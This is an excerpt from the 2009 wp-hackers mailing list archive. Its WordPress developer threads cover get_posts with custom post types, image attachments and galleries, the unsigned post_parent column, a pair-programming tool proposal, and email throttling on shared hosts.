> http://mikeschinkel.com/custom-wordpress-plugins/
>
>
> On Oct 12, 2009, at 8:52 PM, Christopher O'Connell wrote:
>
>> I agree, it should respect post type. Although, I've been solving  
>> this with pure SQL.
>>
>> YMMV
>>
>> ~ Christopher
>>
>> Sent from my iPhone
>>
>> On Oct 12, 2009, at 16:27, Leo germani <leogermani at gmail.com> wrote:
>>
>>> Hi Aaron,
>>>
>>> I often have the same problem when I want a custom query. Thing is  
>>> some
>>> arguments overwrite the others in this function, and your  
>>> resulting query is
>>> selecting posts with post type = post.
>>>
>>> My workaround is to use the query_posts hook to strip out this  
>>> condition
>>> from the resulting sql whenever I want.
>>>
>>> This is an area where Im not sure wether its a bug or an expected  
>>> behavior.
>>> But I think if you pass the post_type paramater it should respect  
>>> it no
>>> matter what other paramaters are passed... Any one agree we could  
>>> open a
>>> ticket for that? To not let other paramaters overwrite the post_type
>>> paramater?
>>>
>>> Leo,,
>>>
>>> On Mon, Oct 12, 2009 at 5:35 PM, Aaron Jorbin <aaron.jorbin at gmail.com 
>>> >wrote:
>>>
>>>> I'm having an issue with get_posts and using a custom post_type and
>>>> custom taxonomy.  It seems to always return empty.  If I do
>>>> `
>>>> $args = array('post_type' => 'my_post_type', 'foo' => 'bar');
>>>> $my_posts = get_posts ($args);
>>>> `
>>>> foo is registered as a registered taxonomy that has query_var set  
>>>> to true.
>>>> If I do a custom query for the following, it returns exactly what I
>>>> would expect.
>>>>
>>>> `
>>>> $sql = "SELECT * from $wpdb->posts
>>>>     LEFT JOIN $wpdb->term_relationships ON
>>>> $wpdb->term_relationships.object_id = $wpdb->posts.id
>>>>     WHERE `$wpdb->posts`.`post_type` = 'my_post_type'
>>>>     AND `$wpdb->term_relationships`.`term_taxonomy_id` =  
>>>> $my_term_id
>>>>     ";
>>>>
>>>> `
>>>>
>>>> Is there an additional step that I am missing?  I opened up a trac
>>>> ticket at http://core.trac.wordpress.org/ticket/10934 but haven't
>>>> heard any responses there, so perhaps this isn't an actual bug.   
>>>> Any
>>>> help that you can lead would be greatly appreciated.
>>>>
>>>> -Aaron Jorbin
>>>>
>>>> --
>>>> aaron.jorbin at gmail.com
>>>> http://aaron.jorb.in
>>>> Twitter: @aaronjorbin
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>>
>>>
>>>
>>> -- 
>>> leogermani.pirex.com.br
>>> leogermani.estudiolivre.org
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From bryanharley at gmail.com  Tue Oct 13 18:48:27 2009
From: bryanharley at gmail.com (Bryan Harley)
Date: Tue, 13 Oct 2009 11:48:27 -0700
Subject: [wp-hackers] Images attached to posts/pages?
In-Reply-To: <161617690910051223u414cadedje90bfa45cf9dd002@mail.gmail.com>
References: <58410e2e0910051216w68518d9eld8b0dbef22c3d6c@mail.gmail.com>
	<161617690910051223u414cadedje90bfa45cf9dd002@mail.gmail.com>
Message-ID: <58410e2e0910131148m5f09e33ah1328a04bfcdee67c@mail.gmail.com>

Say I have a photo already in the Media Library and I want to attach
it to a certain post.  How do I do that?

On Mon, Oct 5, 2009 at 12:23 PM, Otto <otto at ottodestruct.com> wrote:
> Attachments are essentially children of the post they're attached to.
>
> They have the post_parent set to the id of the post, and they have a
> post_type of "attachment".
>
> To get attachments of a post:
> $attachments = get_children( array('post_parent' => $post_id,
> 'post_type' => 'attachment') );
>
> To only get image attachments:
> $attachments = get_children( array('post_parent' => $id, 'post_type'
> => 'attachment', 'post_mime_type' => 'image') );
>
>
> Once you have that, you can basically do this sort of thing:
> foreach ( $attachments as $att_id => $attachment )
> ? ? echo wp_get_attachment_link($att_id, $size, true);
>
> And so forth. There's several wp_get_attachment_* functions you can
> use to get various bits from the attachment posts, once you have their
> id's.
>
> -Otto
>
>
> On Mon, Oct 5, 2009 at 2:16 PM, Bryan Harley <bryanharley at gmail.com> wrote:
>> Can someone explain the concept of how an image (when uploaded via the
>> "Edit Post" or "Edit Page" pages) becomes attached to said post or
>> page?
>>
>> If I were to go to the "About" page and upload 4 images from the image
>> uploader and not insert any of these into my post body... those 4
>> images are still associated will that page, correct?
>>
>> Is there any way to pull these images via PHP? ?Is there a template or
>> reference tag? ?I can use the [gallery] shortcode, but what if I
>> wanted the images displayed in a lightbox gallery for example?
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From scribu at gmail.com  Tue Oct 13 18:57:19 2009
From: scribu at gmail.com (scribu)
Date: Tue, 13 Oct 2009 21:57:19 +0300
Subject: [wp-hackers] Images attached to posts/pages?
In-Reply-To: <58410e2e0910131148m5f09e33ah1328a04bfcdee67c@mail.gmail.com>
References: <58410e2e0910051216w68518d9eld8b0dbef22c3d6c@mail.gmail.com>
	<161617690910051223u414cadedje90bfa45cf9dd002@mail.gmail.com>
	<58410e2e0910131148m5f09e33ah1328a04bfcdee67c@mail.gmail.com>
Message-ID: <349fe48b0910131157s7885ec9bg27cb857caaa45cf2@mail.gmail.com>

On Tue, Oct 13, 2009 at 9:48 PM, Bryan Harley <bryanharley at gmail.com> wrote:

> Say I have a photo already in the Media Library and I want to attach
> it to a certain post.  How do I do that?
>


Well, if the image isn't already attached to another post, you'll have an
"Attach to" link in wp-admin/upload.php.


-- 
http://scribu.net

From bryanharley at gmail.com  Tue Oct 13 19:04:24 2009
From: bryanharley at gmail.com (Bryan Harley)
Date: Tue, 13 Oct 2009 12:04:24 -0700
Subject: [wp-hackers] Images attached to posts/pages?
In-Reply-To: <349fe48b0910131157s7885ec9bg27cb857caaa45cf2@mail.gmail.com>
References: <58410e2e0910051216w68518d9eld8b0dbef22c3d6c@mail.gmail.com>
	<161617690910051223u414cadedje90bfa45cf9dd002@mail.gmail.com>
	<58410e2e0910131148m5f09e33ah1328a04bfcdee67c@mail.gmail.com>
	<349fe48b0910131157s7885ec9bg27cb857caaa45cf2@mail.gmail.com>
Message-ID: <58410e2e0910131204k160a338ex6da6f58a09cecbde@mail.gmail.com>

I'm talking about attaching one image to multiple posts.  Is this possible?


On Tue, Oct 13, 2009 at 11:57 AM, scribu <scribu at gmail.com> wrote:
> On Tue, Oct 13, 2009 at 9:48 PM, Bryan Harley <bryanharley at gmail.com> wrote:
>
>> Say I have a photo already in the Media Library and I want to attach
>> it to a certain post. ?How do I do that?
>>
>
>
> Well, if the image isn't already attached to another post, you'll have an
> "Attach to" link in wp-admin/upload.php.
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Tue Oct 13 20:04:15 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 13 Oct 2009 15:04:15 -0500
Subject: [wp-hackers] Images attached to posts/pages?
In-Reply-To: <58410e2e0910131204k160a338ex6da6f58a09cecbde@mail.gmail.com>
References: <58410e2e0910051216w68518d9eld8b0dbef22c3d6c@mail.gmail.com> 
	<161617690910051223u414cadedje90bfa45cf9dd002@mail.gmail.com> 
	<58410e2e0910131148m5f09e33ah1328a04bfcdee67c@mail.gmail.com> 
	<349fe48b0910131157s7885ec9bg27cb857caaa45cf2@mail.gmail.com> 
	<58410e2e0910131204k160a338ex6da6f58a09cecbde@mail.gmail.com>
Message-ID: <161617690910131304i2cf3878en6fe138fdf2f835db@mail.gmail.com>

On Tue, Oct 13, 2009 at 2:04 PM, Bryan Harley <bryanharley at gmail.com> wrote:
> I'm talking about attaching one image to multiple posts. ?Is this possible?

No. Attachments can only have one parent.


-Otto

From scribu at gmail.com  Tue Oct 13 20:53:41 2009
From: scribu at gmail.com (scribu)
Date: Tue, 13 Oct 2009 23:53:41 +0300
Subject: [wp-hackers] Images attached to posts/pages?
In-Reply-To: <161617690910131304i2cf3878en6fe138fdf2f835db@mail.gmail.com>
References: <58410e2e0910051216w68518d9eld8b0dbef22c3d6c@mail.gmail.com>
	<161617690910051223u414cadedje90bfa45cf9dd002@mail.gmail.com>
	<58410e2e0910131148m5f09e33ah1328a04bfcdee67c@mail.gmail.com>
	<349fe48b0910131157s7885ec9bg27cb857caaa45cf2@mail.gmail.com>
	<58410e2e0910131204k160a338ex6da6f58a09cecbde@mail.gmail.com>
	<161617690910131304i2cf3878en6fe138fdf2f835db@mail.gmail.com>
Message-ID: <349fe48b0910131353k9600975o91bbcc4adac7ac69@mail.gmail.com>

On Tue, Oct 13, 2009 at 11:04 PM, Otto <otto at ottodestruct.com> wrote:

> On Tue, Oct 13, 2009 at 2:04 PM, Bryan Harley <bryanharley at gmail.com>
> wrote:
> > I'm talking about attaching one image to multiple posts.  Is this
> possible?
>
> No. Attachments can only have one parent.
>

There was a GSoC
project<http://gsoc2009wp.wordpress.com/rudolf-photo-albums/>for
fixing this, but it won't make it into WP 2.9.


-- 
http://scribu.net

From philip at hetjens.eu  Wed Oct 14 12:28:56 2009
From: philip at hetjens.eu (Philip Hetjens)
Date: Wed, 14 Oct 2009 14:28:56 +0200
Subject: [wp-hackers] Unsigned wp_posts.post_parent
Message-ID: <e594c9a50910140528j205cd233r998cc6ac8d96c821@mail.gmail.com>

Hi everybody,
with Wordpress 2.8.0 the field definition of wp_posts.post_parent changed:
from "bigint(20)" to "bigint(20) unsigned".

The MetaWeblog-API (I know, not fully supported anymore by wordpress) sets
the post_parent of attachments first to -1 and as soon as the post itself is
uploaded all attachments with post_parent -1 will be updated with the
correct post_parent.

Is it possible to remove the unsigned flag for the field, so that the api
works again.

Thanks,
Philip

From jane at automattic.com  Wed Oct 14 12:47:57 2009
From: jane at automattic.com (Jane Wells)
Date: Wed, 14 Oct 2009 08:47:57 -0400
Subject: [wp-hackers] Images attached to posts/pages?
In-Reply-To: <mailman.15.1255521602.21449.wp-hackers@lists.automattic.com>
References: <mailman.15.1255521602.21449.wp-hackers@lists.automattic.com>
Message-ID: <293590E2-8F0E-4839-80E6-F04B1DCBB047@automattic.com>


On Tue, Oct 13, 2009 at 2:04 PM, Bryan Harley <bryanharley at gmail.com>  
wrote:
> I'm talking about attaching one image to multiple posts. ?Is this  
> possible?
Otto responded: No. Attachments can only have one parent.

-You can't attach to multiple directly from the Library, but you can  
display a media file in more than one post if you go to the individual  
posts to do it. In the media popup uploader, just click on the Media  
Library tab in the upper right and you can select any image from your  
library to embed in the post rather than uploading a new image or  
embedding from a URL.
Jane


From eike.starkmann at fu-berlin.de  Wed Oct 14 12:48:39 2009
From: eike.starkmann at fu-berlin.de (Eike Starkmann)
Date: Wed, 14 Oct 2009 14:48:39 +0200
Subject: [wp-hackers] Distributed Pairprogramming for Wordpress development?
Message-ID: <4AD5C8A7.9030701@fu-berlin.de>

Dear Wordpress Team,

My name is Eike Starkmann and I'm working working as part of the Saros 
Team at the Freie University in Berlin.

Saros is an Eclipse plugin for collaborative text editing and 
distributed pair programming, i.e. it allows two or more developers to 
work together in real-time on the same files. It is similar to Gobby, 
SubEthaEdit or Google Docs but focuses on programming in Eclipse.

It is my master thesis to figure out whether Saros is useful when 
developing Free/Open Source Software. I already was in contact with  to 
other projects, for example Typo3 and got some good response.

In my opinion Wordpress can benefit from Saros because I think it brings 
many advantages to Open Source Software development:

* Distributed Pair Programming is like a live peer review. This should 
help with finding good design, get rid of bugs, increase readability, etc.

* Transferring knowledge should be easier to do when more than one 
person look at and work with the same code. This should also help to 
give new developers an introduction to the code.

* In contrast to screen sharing, Saros only shares your actions inside 
of Eclipse with regards to the project you are both working on (think 
privacy) and you are still independent to explore the project on your own.

Saros can be useful in the following contexts:

* Working on complicated problems in the code
* Performing code reviews
* Debugging
* Code presentation
* Code sprints
* Introducing new developers to the project
* ...

What do you think? Could you and Wordpress benefit from doing pair 
programming using Saros? If you think so I would like to join our 
project and help you with using Saros.

If you are interested in Saros but still curious about how it works 
please visit our website or feel free to contact me.

I hope you will find Saros useful and give me feedback.

Kind regards, Eike Starkmann

Website: https://www.inf.fu-berlin.de/w/SE/DPP
Update Site: http://dpp.sf.net/update
Saros @ SF: http://sourceforge.net/projects/dpp/
Programming Languages Supported by Saros : 
https://www.inf.fu-berlin.de/w/SE/DPPCompatiblePlugin


-- 
Eike Starkmann
This message is part of my Master thesis research. Feel free to contact
my advisors in case of inappropriate behavior on my side:
christopher.oezbek at fu-berlin.de and stephan.salinger at fu-berlin.de

From scribu at gmail.com  Wed Oct 14 14:29:54 2009
From: scribu at gmail.com (scribu)
Date: Wed, 14 Oct 2009 17:29:54 +0300
Subject: [wp-hackers] Unsigned wp_posts.post_parent
In-Reply-To: <e594c9a50910140528j205cd233r998cc6ac8d96c821@mail.gmail.com>
References: <e594c9a50910140528j205cd233r998cc6ac8d96c821@mail.gmail.com>
Message-ID: <349fe48b0910140729g10ea1345t6fd3d2711101b307@mail.gmail.com>

On Wed, Oct 14, 2009 at 3:28 PM, Philip Hetjens <philip at hetjens.eu> wrote:

> Hi everybody,
> with Wordpress 2.8.0 the field definition of wp_posts.post_parent changed:
> from "bigint(20)" to "bigint(20) unsigned".
>

There is a ticket open for this issue:

http://core.trac.wordpress.org/ticket/9471


-- 
http://scribu.net

From otto at ottodestruct.com  Wed Oct 14 15:03:10 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 14 Oct 2009 10:03:10 -0500
Subject: [wp-hackers] Unsigned wp_posts.post_parent
In-Reply-To: <349fe48b0910140729g10ea1345t6fd3d2711101b307@mail.gmail.com>
References: <e594c9a50910140528j205cd233r998cc6ac8d96c821@mail.gmail.com> 
	<349fe48b0910140729g10ea1345t6fd3d2711101b307@mail.gmail.com>
Message-ID: <161617690910140803v84e526cvb1ccf617798633e5@mail.gmail.com>

On Wed, Oct 14, 2009 at 9:29 AM, scribu <scribu at gmail.com> wrote:
> On Wed, Oct 14, 2009 at 3:28 PM, Philip Hetjens <philip at hetjens.eu> wrote:
>
>> Hi everybody,
>> with Wordpress 2.8.0 the field definition of wp_posts.post_parent changed:
>> from "bigint(20)" to "bigint(20) unsigned".
>>
>
> There is a ticket open for this issue:
>
> http://core.trac.wordpress.org/ticket/9471

Ticket for the issue he's describing is actually here:
http://core.trac.wordpress.org/ticket/10521

-Otto

From otto at ottodestruct.com  Wed Oct 14 15:10:17 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 14 Oct 2009 10:10:17 -0500
Subject: [wp-hackers] Distributed Pairprogramming for Wordpress
	development?
In-Reply-To: <4AD5C8A7.9030701@fu-berlin.de>
References: <4AD5C8A7.9030701@fu-berlin.de>
Message-ID: <161617690910140810n688a2af5k8b4ac00d7703569b@mail.gmail.com>

On Wed, Oct 14, 2009 at 7:48 AM, Eike Starkmann
<eike.starkmann at fu-berlin.de> wrote:
> Saros is an Eclipse plugin for collaborative text editing and distributed
> pair programming, i.e. it allows two or more developers to work together in
> real-time on the same files.

Speaking as somebody who's been coding professionally for 10 years, I
couldn't let this go by...

I've had to do this sort of thing before (not distributed, but pair
programming). It is, by far, the worst idea ever conceived by
man(agers). I would rip my own arm off and beat myself to death with
it before I'd ever do this sort of thing again.

The theory of pair programming is that you have two developers working
on the same piece of code, able to notice and correct mistakes.

The reality of pair programming is that one guy is better than the
other guy, and spends half his time explaining the problem and
solution to the other guy, instead of simply coding the damn thing.
The lesser of the two programmers only drags the other guy down to his
level, and wastes both of their time.

The only way that pair programming works is if both programmers are a)
equally skilled and b) not particularly skilled. In other words, for
newbs fresh out of college, it works fine. For a seasoned programmer,
the very notion is a valid reason to look for a job elsewhere.

In general, it's a horrible practice, and anybody actively using it is
an idiot. IMO, of course.

Also, peer review is highly overrated as well, for other reasons.
People who actively write good code don't need it, and people who
don't write good code shouldn't be put in the position of writing code
in the first place.

-Otto
Sent from Memphis, TN, United States

From otto at ottodestruct.com  Wed Oct 14 15:16:36 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 14 Oct 2009 10:16:36 -0500
Subject: [wp-hackers] Images attached to posts/pages?
In-Reply-To: <293590E2-8F0E-4839-80E6-F04B1DCBB047@automattic.com>
References: <mailman.15.1255521602.21449.wp-hackers@lists.automattic.com> 
	<293590E2-8F0E-4839-80E6-F04B1DCBB047@automattic.com>
Message-ID: <161617690910140816t3264842dnfa04ec3a9de877af@mail.gmail.com>

On Wed, Oct 14, 2009 at 7:47 AM, Jane Wells <jane at automattic.com> wrote:
> On Tue, Oct 13, 2009 at 2:04 PM, Bryan Harley <bryanharley at gmail.com> wrote:
>>
>> I'm talking about attaching one image to multiple posts. ?Is this
>> possible?
>
> Otto responded: No. Attachments can only have one parent.
>
> -You can't attach to multiple directly from the Library, but you can display
> a media file in more than one post if you go to the individual posts to do
> it. In the media popup uploader, just click on the Media Library tab in the
> upper right and you can select any image from your library to embed in the
> post rather than uploading a new image or embedding from a URL.
> Jane

Oh yes, you can display any image anywhere you like, individually. But
galleries display the attached images, and attachments attach to one
parent post.

You can include an id field on a gallery shortcode to display a
gallery from a different post id, though. Like if you wanted to
display the gallery for the post with id number 123, then would do the
trick:

[gallery id="123"]

So that will work for display purposes, if needed.

-Otto
Sent from Memphis, TN, United States

From raven at mecus.es  Wed Oct 14 15:20:34 2009
From: raven at mecus.es (Rafael Poveda - RaveN)
Date: Wed, 14 Oct 2009 17:20:34 +0200
Subject: [wp-hackers] Images attached to posts/pages?
In-Reply-To: <161617690910140816t3264842dnfa04ec3a9de877af@mail.gmail.com>
References: <mailman.15.1255521602.21449.wp-hackers@lists.automattic.com>
	<293590E2-8F0E-4839-80E6-F04B1DCBB047@automattic.com>
	<161617690910140816t3264842dnfa04ec3a9de877af@mail.gmail.com>
Message-ID: <6D8F2B96-87BC-4D8B-B632-B9C1E9E92E72@mecus.es>

Thanks a lot.

This will be very useful for a project in development.

Thanks :)
El 14/10/2009, a las 17:16 , Otto escribi?:

> On Wed, Oct 14, 2009 at 7:47 AM, Jane Wells <jane at automattic.com>  
> wrote:
>> On Tue, Oct 13, 2009 at 2:04 PM, Bryan Harley  
>> <bryanharley at gmail.com> wrote:
>>>
>>> I'm talking about attaching one image to multiple posts. ?Is this
>>> possible?
>>
>> Otto responded: No. Attachments can only have one parent.
>>
>> -You can't attach to multiple directly from the Library, but you  
>> can display
>> a media file in more than one post if you go to the individual  
>> posts to do
>> it. In the media popup uploader, just click on the Media Library  
>> tab in the
>> upper right and you can select any image from your library to embed  
>> in the
>> post rather than uploading a new image or embedding from a URL.
>> Jane
>
> Oh yes, you can display any image anywhere you like, individually. But
> galleries display the attached images, and attachments attach to one
> parent post.
>
> You can include an id field on a gallery shortcode to display a
> gallery from a different post id, though. Like if you wanted to
> display the gallery for the post with id number 123, then would do the
> trick:
>
> [gallery id="123"]
>
> So that will work for display purposes, if needed.
>
> -Otto
> Sent from Memphis, TN, United States
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


From cdunde1 at tampabay.rr.com  Wed Oct 14 15:44:48 2009
From: cdunde1 at tampabay.rr.com (barry)
Date: Wed, 14 Oct 2009 11:44:48 -0400
Subject: [wp-hackers] custom page template
Message-ID: <159BD4590CCC476E96B096B00A005431@barry>

I own the site www.whowillwinthe2012election.com/wordpress and I need a custom page template for this page    The page lists the people who blog on my site.

I want the page to have 3 sections for democrat bloggers, republican bloggers, and independant bloggers.  Each of those 3 sections will have a logo or political picture of some sort.  I want it to be very clean and unique looking because it is a highly visited page on the site.  

Email me if you are interested and can turn the page into something great.

Thanks,

Barry

From matt at sivel.net  Wed Oct 14 15:53:25 2009
From: matt at sivel.net (Matt Martz)
Date: Wed, 14 Oct 2009 11:53:25 -0400
Subject: [wp-hackers] custom page template
In-Reply-To: <159BD4590CCC476E96B096B00A005431@barry>
References: <159BD4590CCC476E96B096B00A005431@barry>
Message-ID: <20091014155325.GA28758@worf.noc.sivel.net>

On Wed, Oct 14, 2009 at 11:44:48AM -0400, barry wrote:
> I own the site www.whowillwinthe2012election.com/wordpress and I need a custom page template for this page    The page lists the people who blog on my site.
> 
> I want the page to have 3 sections for democrat bloggers, republican bloggers, and independant bloggers.  Each of those 3 sections will have a logo or political picture of some sort.  I want it to be very clean and unique looking because it is a highly visited page on the site.  
> 
> Email me if you are interested and can turn the page into something great.
> 
> Thanks,
> 
> Barry

I think you are on the wrong list.  You might want to look at the wp-pro
mailing list.

http://lists.automattic.com/mailman/listinfo/wp-pro
-- 
Matt Martz
matt at sivel.net
http://sivel.net/

From tareq1988 at gmail.com  Wed Oct 14 19:15:48 2009
From: tareq1988 at gmail.com (Tareq Hasan)
Date: Thu, 15 Oct 2009 02:15:48 +0700
Subject: [wp-hackers] Help Needed for latest post from a selected category
Message-ID: <9140446a0910141215g1cc4aa5el7e54ebcbc0f22a60@mail.gmail.com>

Hi,
is there any way to get the post title and content and other field like
time, tag and others as a variable in loop?
That means, i want the_content(), the_permalink() or whatever in the loop as
a variable and want to show them by echo. is there any method? I didn't
found :(
Help me please.

<?php while (have_posts()) : the_post(); ?>
           <h3><a href="<?php the_permalink() ?>"><?php the_title()?></a>
           <p><?php the_content()?></p>
<?php endwhile; ?>

--------------------------------------------
Best regard
Tareq Hasan
My Blog (http://tareq.weDevs.com)
Follow me: (http://twitter.com/tareq_cse)

From sharon at BrewerRadio.com  Wed Oct 14 19:22:00 2009
From: sharon at BrewerRadio.com (Sharon Chambers)
Date: Wed, 14 Oct 2009 15:22:00 -0400
Subject: [wp-hackers] Help Needed for latest post from a selected
	category
Message-ID: <a866d5db.1ca4d03.19b64bee.4e45@BrewerRadio.com>

I've found most of the methods have corresponding get_* methods that allow you to parse accordingly...
$content = get_the_content();
$title = get_the_title();
$plink = get_the_permalink();


-----Original Message-----
is there any way to get the post title and content and other field like
time, tag and others as a variable in loop?
That means, i want the_content(), the_permalink() or whatever in the loop as
a variable and want to show them by echo. is there any method? I didn't
found :(
Help me please.

<?php while (have_posts()) : the_post(); ?>
           <h3><a href="<?php the_permalink() ?>"><?php the_title()?></a>
           <p><?php the_content()?></p>
<?php endwhile; ?>



From tareq1988 at gmail.com  Wed Oct 14 19:43:54 2009
From: tareq1988 at gmail.com (Tareq Hasan)
Date: Thu, 15 Oct 2009 02:43:54 +0700
Subject: [wp-hackers] Help Needed for latest post from a selected
	category
In-Reply-To: <a866d5db.1ca4d03.19b64bee.4e45@BrewerRadio.com>
References: <a866d5db.1ca4d03.19b64bee.4e45@BrewerRadio.com>
Message-ID: <9140446a0910141243s4f788612l732bb8ac12ce56fb@mail.gmail.com>

Thanks for the very fast reply. Your tips was great.

But i am sorry for not mentioning one thing. I am using this code in my
plugin under a function. That doesn't work there.

BTW, is there any easy way to get latest 5 post from 3 category like below?

LATEST 5 POST FROM ===> UNCATAGORIES CATEGORY
LATEST 5 POST FROM ===> TWITTER CATEGORY
LATEST 5 POST FROM ===> WORDPRESS CATEGORY

This is just an example. Thats what i want to do: listing posts from some
categories with their title and trimmed content .
--------------------------------------------
Best regards
Tareq Hasan
My Blog (http://tareq.weDevs.com)
Follow me: (http://twitter.com/tareq_cse)

From anacin at gwhatchet.com  Wed Oct 14 19:47:10 2009
From: anacin at gwhatchet.com (Andrew Nacin)
Date: Wed, 14 Oct 2009 15:47:10 -0400
Subject: [wp-hackers] Help Needed for latest post from a selected
	category
In-Reply-To: <a866d5db.1ca4d03.19b64bee.4e45@BrewerRadio.com>
References: <a866d5db.1ca4d03.19b64bee.4e45@BrewerRadio.com>
Message-ID: <8b870c460910141247y294d50e8hc0c6f43f069d464d@mail.gmail.com>

It's actually get_permalink(). Some methods alternatively have an argument
to prevent echoing, such as the_title_attribute('echo=0').

You also need to keep in mind filters and such. See also the note in the
codex for the_content:
http://codex.wordpress.org/Template_Tags/the_content#Alternative_Usage.
Object buffering can always be used as well.

On Wed, Oct 14, 2009 at 15:22, Sharon Chambers <sharon at brewerradio.com>wrote:

> I've found most of the methods have corresponding get_* methods that allow
> you to parse accordingly...
> $content = get_the_content();
> $title = get_the_title();
> $plink = get_the_permalink();
>
>
> -----Original Message-----
> is there any way to get the post title and content and other field like
> time, tag and others as a variable in loop?
> That means, i want the_content(), the_permalink() or whatever in the loop
> as
> a variable and want to show them by echo. is there any method? I didn't
> found :(
> Help me please.
>
> <?php while (have_posts()) : the_post(); ?>
>           <h3><a href="<?php the_permalink() ?>"><?php the_title()?></a>
>           <p><?php the_content()?></p>
> <?php endwhile; ?>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From tareq1988 at gmail.com  Wed Oct 14 20:10:53 2009
From: tareq1988 at gmail.com (Tareq Hasan)
Date: Thu, 15 Oct 2009 03:10:53 +0700
Subject: [wp-hackers] Help Needed for latest post from a selected
	category
In-Reply-To: <8b870c460910141247y294d50e8hc0c6f43f069d464d@mail.gmail.com>
References: <a866d5db.1ca4d03.19b64bee.4e45@BrewerRadio.com> 
	<8b870c460910141247y294d50e8hc0c6f43f069d464d@mail.gmail.com>
Message-ID: <9140446a0910141310h428ff389r90e92bec8d156169@mail.gmail.com>

Thanks Buddies for the help
--------------------------------------------
Best regards
Tareq Hasan
My Blog (http://tareq.weDevs.com)
Follow me: (http://twitter.com/tareq_cse)

From viniciusandre at gmail.com  Wed Oct 14 21:06:02 2009
From: viniciusandre at gmail.com (Vinicius Massuchetto)
Date: Wed, 14 Oct 2009 18:06:02 -0300
Subject: [wp-hackers] Showing Global Latest Posts on WPMU
Message-ID: <4ede8f490910141406v2ea33ef1y1dcad9ccf6e8906@mail.gmail.com>

I found some solutions on the internet about selecting the latest post
to be shown on the home index of wpmu. Basically they loop the values
of wp_blogs table for each wp_#_posts, or even use RSS feeds of the
blogs for that.

The fact is that I also need to cross some values on wp_#_postmeta and
wp_#_options due to some plugins I developed, and the solution I found
was to select everything I wanted with table joins for each post
table, then output series of `unions` to $wpdb.

Except putting this job to feed a specific table or generate a RSS
feed, I want to know if there's a clever solution to select posts from
diferent blogs mainly because I'm worried if all these operations can
overload the server while working on a big wpmu database.

Thanks!
--
Vin?cius Massuchetto
http://vinicius.soylocoporti.org.br

From Brian at b5media.com  Wed Oct 14 21:52:38 2009
From: Brian at b5media.com (Brian Layman)
Date: Wed, 14 Oct 2009 17:52:38 -0400
Subject: [wp-hackers] Unsigned wp_posts.post_parent
In-Reply-To: <e594c9a50910140528j205cd233r998cc6ac8d96c821@mail.gmail.com>
References: <e594c9a50910140528j205cd233r998cc6ac8d96c821@mail.gmail.com>
Message-ID: <007301ca4d18$a6841bb0$f38c5310$@com>

Yeah, this has caused a whole lot of problems across b5 too. Basically any
WP user with a plugin that worked with the post attachements/galleries had
it break. In our case, we simply altered all of our databases restoring the
signed field type. That got us into production immediately.

We'd looked at possibly rewriting the code to look for 0 instead of -1,
however upon further investication, that produced result sets of tens of
thousands of items that had to be iterated, rather than the few posts that
filtering -1 returned.

I've not yet returned to this topic, but my next plan of attack was to
create a constant for (essentially) max(unsigned bigint(20)) which is
"18,446,744,073,709,551,615" according to http://bit.ly/VXYdk. I think we
are safe to assume that there are no blogs with over a quintillion posts.
Replacing that value in the plugins should be easy enough. Creating a
constant for it - if there isn't one already, might not be a bad idea either
specifically for this kind of use.  

In anycase, either of these approaches might work for you, at least until
the ticket is addressed.

______________________________________________
Brian Layman
b5media, Inc.


From william.canino at googlemail.com  Thu Oct 15 00:18:27 2009
From: william.canino at googlemail.com (William Canino)
Date: Wed, 14 Oct 2009 20:18:27 -0400
Subject: [wp-hackers] How to throttle emails on hosts with email sending
	limits?
In-Reply-To: <8BA69615-32FE-432A-AF1F-0D513C6D96CE@cloudiness.com>
References: <e4dc67e0910091239n2a11691blcbf35aa2f85d51f2@mail.gmail.com>
	<161617690910091331j7afc7a6cw4b485c584f0eb0d3@mail.gmail.com>
	<8BA69615-32FE-432A-AF1F-0D513C6D96CE@cloudiness.com>
Message-ID: <e4dc67e0910141718v23be186bp45e6f03762854753@mail.gmail.com>

I definitely ought to figure this out soon.

I installed WordPress on Dreamhost today.  DH has a "100 recipients
per hour" limit.

Even without plugins, if the blog gets 101 comments in one hour,
wordpress's "new comment" notification emails to the post authors will
hit the limit.

Therefore I will have to override wp_mail() itself.

The new wp_mail() somehow needs to remember how many recipients have
been sent in the last 3600 seconds.  Three ways to do this:

1. I have it accumulate emails unto a wp_option setting and with
wp_schedule_event send just enough during the top of every hour. On
the average they get it half an hour late.
2. I store each email as a record in a table, and record the sent
times, all within a SQL SELECT-UPDATE-COMMIT transaction.  Thankfully,
the emails don't have 2Mb attachments!
3. A better option?

Sorry if ask again, guys, has anyone integrated mail queuing code to WordPress?




2009/10/9 Art Delano <ajd at cloudiness.com>:
> Would it be possible to make it work like this?
> 1. Check if anything needs sending
> 2. Concatenates all pending emails into a digested message
>
> This would reduce the number of mails sent to one per time window.
>
> Art
>
> On Oct 9, 2009, at 4:31 PM, Otto wrote:
>
>> Looking at the plugin, it appears to hook to comment_post to send the
>> notification emails.
>>
>> I'd rework it a bit. Change the comment_post hook to run a new
>> function which does a wp_schedule_event to a new action (maybe
>> stc_send_notifications?). Then hook that to a new function which does
>> the following:
>> 1. checks to see if anything needs sending still
>> 2. sends emails up to limit
>> 3. if still some left, do another wp_schedule_event to rerun at some
